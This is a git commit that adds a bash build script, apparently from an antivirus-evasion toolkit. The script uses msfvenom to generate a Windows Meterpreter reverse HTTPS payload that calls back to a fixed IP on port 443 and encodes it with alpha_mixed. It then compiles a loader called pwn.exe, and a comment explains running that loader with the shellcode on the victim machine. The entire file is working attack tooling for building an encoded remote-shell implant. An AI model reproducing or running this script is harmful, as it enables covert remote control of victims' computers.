a005432f7df7f7efd443b5f0606a49e2c6af5f77
Daniel Sauder <daniel.sauder@web.de>
2017-08-09 21:07:56 +0200

    add alphamixedcmd

---
+++ build/build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
@@ -0,0 +1,11 @@
+#!/bin/bash          
+# simple example script for building the .exe file
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+# make meterpreter reverse payload, encoded with msf alpha_mixed 
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.208 lport=443 -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw
+# compile to pwn.exe file
+$win32_compiler -ffixed-eax -o pwn.exe ./source/alphamixedcmd.c
+# now call with the output shellcode as parameter of pwn.exe on the victim machine: pwn.exe shellcode
